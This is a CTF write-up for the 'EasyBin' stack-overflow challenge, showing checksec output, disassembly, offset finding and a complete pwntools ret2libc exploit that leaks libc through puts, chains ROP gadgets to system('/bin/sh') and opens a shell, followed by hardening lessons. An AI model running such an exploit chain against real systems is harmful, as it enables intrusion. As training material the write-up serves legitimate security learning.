# CTF Write-up: Buffer Overflow - EasyBin

<style>
.ctf-meta { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; }
.meta-item { padding: 12px; background: var(--md-code-bg-color); border-radius: 4px; border-left: 3px solid var(--md-primary-fg-color); }
.meta-label { font-size: 0.85em; opacity: 0.7; margin-bottom: 4px; }
.meta-value { font-weight: 500; }
.flag-box { padding: 15px; background: var(--md-code-bg-color); border-radius: 4px; margin: 15px 0; font-family: monospace; border: 2px dashed var(--md-accent-fg-color); cursor: pointer; }
.flag-box:hover { background: var(--md-accent-fg-color--transparent); }
.difficulty { display: inline-block; padding: 4px 12px; border-radius: 12px; font-size: 0.85em; font-weight: 500; }
.diff-easy { background: #4CAF50; color: white; }
.diff-medium { background: #FF9800; color: white; }
.diff-hard { background: #f44336; color: white; }
.step-container { margin: 25px 0; }
.step-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
.step-number { width: 32px; height: 32px; border-radius: 50%; background: var(--md-primary-fg-color); color: white; display: flex; align-items: center; justify-content: center; font-weight: 600; }
.tools { display: flex; flex-wrap: wrap; gap: 8px; margin: 15px 0; }
.tool-tag { padding: 6px 12px; background: var(--md-code-bg-color); border-radius: 4px; font-size: 0.9em; }
</style>

<div class="ctf-meta">
  <div class="meta-item">
    <div class="meta-label">Challenge</div>
    <div class="meta-value">EasyBin</div>
  </div>
  <div class="meta-item">
    <div class="meta-label">Category</div>
    <div class="meta-value">Binary Exploitation</div>
  </div>
  <div class="meta-item">
    <div class="meta-label">Difficulty</div>
    <div class="meta-value"><span class="difficulty diff-easy">Easy</span></div>
  </div>
  <div class="meta-item">
    <div class="meta-label">Points</div>
    <div class="meta-value">100</div>
  </div>
</div>

## Challenge Description

> A simple binary with basic stack overflow vulnerability. Can you exploit it to get the flag?
> 
> **Given files:** `easybin`, `libc.so.6`
> 
> **Connection:** `nc ctf.example.com 1337`

## Tools Used

<div class="tools">
  <span class="tool-tag">GDB + pwndbg</span>
  <span class="tool-tag">pwntools</span>
  <span class="tool-tag">ROPgadget</span>
  <span class="tool-tag">checksec</span>
</div>

## Solution

<div class="step-container">
  <div class="step-header">
    <div class="step-number">1</div>
    <h3 style="margin: 0;">Reconnaissance & Analysis</h3>
  </div>

Đầu tiên check các protection mechanisms:

```bash
$ checksec easybin
[*] '/path/to/easybin'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

**Key findings:**
- No stack canary → vulnerable to buffer overflow
- NX enabled → không thể execute shellcode trên stack
- No PIE → địa chỉ functions cố định
- Partial RELRO → GOT writable

</div>

<div class="step-container">
  <div class="step-header">
    <div class="step-number">2</div>
    <h3 style="margin: 0;">Reverse Engineering</h3>
  </div>

Dùng GDB để phân tích binary:

```asm
gdb-peda$ disas main
Dump of assembler code for function main:
   0x00000000004011b6 <+0>:     push   rbp
   0x00000000004011b7 <+1>:     mov    rbp,rsp
   0x00000000004011ba <+4>:     sub    rsp,0x40
   0x00000000004011be <+8>:     lea    rax,[rbp-0x40]
   0x00000000004011c2 <+12>:    mov    rdi,rax
   0x00000000004011c5 <+15>:    call   0x401080 <gets@plt>
```

**Phát hiện:**
- Buffer size: 64 bytes (0x40)
- Sử dụng `gets()` → unsafe, không check boundary
- Offset đến return address: 72 bytes (64 + 8 RBP)

</div>

<div class="step-container">
  <div class="step-header">
    <div class="step-number">3</div>
    <h3 style="margin: 0;">Finding Offset</h3>
  </div>

Generate pattern và tìm offset chính xác:

```python
from pwn import *

# Generate cyclic pattern
pattern = cyclic(100)

# Attach debugger
p = process('./easybin')
p.sendline(pattern)

# Check crash
# RIP = 0x6161616c61616161 → offset = 72
offset = cyclic_find(0x6161616c61616161)
print(f"Offset: {offset}")
```

</div>

<div class="step-container">
  <div class="step-header">
    <div class="step-number">4</div>
    <h3 style="margin: 0;">Exploitation Strategy</h3>
  </div>

Do có NX enabled, sử dụng **ret2libc** technique:

1. Leak địa chỉ libc bằng cách gọi `puts(puts@GOT)`
2. Calculate libc base address
3. ROP chain để gọi `system("/bin/sh")`

**ROP Gadgets cần thiết:**
```bash
$ ROPgadget --binary easybin | grep "pop rdi"
0x00000000004012a3 : pop rdi ; ret
```

</div>

<div class="step-container">
  <div class="step-header">
    <div class="step-number">5</div>
    <h3 style="margin: 0;">Exploit Code</h3>
  </div>

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./easybin')
libc = ELF('./libc.so.6')

# p = process('./easybin')
p = remote('ctf.example.com', 1337)

# Gadgets & addresses
pop_rdi = 0x4012a3
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

# Stage 1: Leak libc address
payload = b'A' * 72
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)  # Return to main

p.sendline(payload)
p.recvline()

# Parse leaked address
leak = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f"Leaked puts@libc: {hex(leak)}")

# Calculate libc base
libc.address = leak - libc.symbols['puts']
log.success(f"Libc base: {hex(libc.address)}")

# Stage 2: Get shell
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

payload = b'A' * 72
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)
p.interactive()
```

</div>

<div class="step-container">
  <div class="step-header">
    <div class="step-number">6</div>
    <h3 style="margin: 0;">Getting the Flag</h3>
  </div>

```bash
$ python3 exploit.py
[+] Opening connection to ctf.example.com on port 1337
[+] Leaked puts@libc: 0x7f8b2e4a0aa0
[+] Libc base: 0x7f8b2e420000
[*] Switching to interactive mode
$ cat flag.txt
CTF{st4ck_0v3rfl0w_1s_3asy!}
```

</div>

## Flag

<div class="flag-box" onclick="copyFlag()">
🚩 <code id="flagText">CTF{st4ck_0v3rfl0w_1s_3asy!}</code>
</div>

<script>
function copyFlag() {
  const flagText = document.getElementById('flagText').textContent;
  navigator.clipboard.writeText(flagText).then(() => {
    const flagBox = document.querySelector('.flag-box');
    const originalText = flagBox.innerHTML;
    flagBox.innerHTML = '✓ Flag copied to clipboard!';
    setTimeout(() => { flagBox.innerHTML = originalText; }, 2000);
  });
}
</script>

## Lessons Learned

1. **Input Validation:** Luôn validate input, không dùng unsafe functions như `gets()`
2. **Stack Canaries:** Enable stack protection để phát hiện buffer overflow
3. **ASLR + PIE:** Randomize memory layout để tăng độ khó exploit
4. **NX bit:** Ngăn execute code trên stack, nhưng không đủ chống ret2libc
5. **RELRO Full:** Protect GOT khỏi bị overwrite

## References

- [ROPEmporium](https://ropemporium.com/)
- [LiveOverflow Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- [pwntools Documentation](https://docs.pwntools.com/)
- [GDB Cheat Sheet](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)

---

*Write-up by: [Your Name] | Date: 2025-11-02*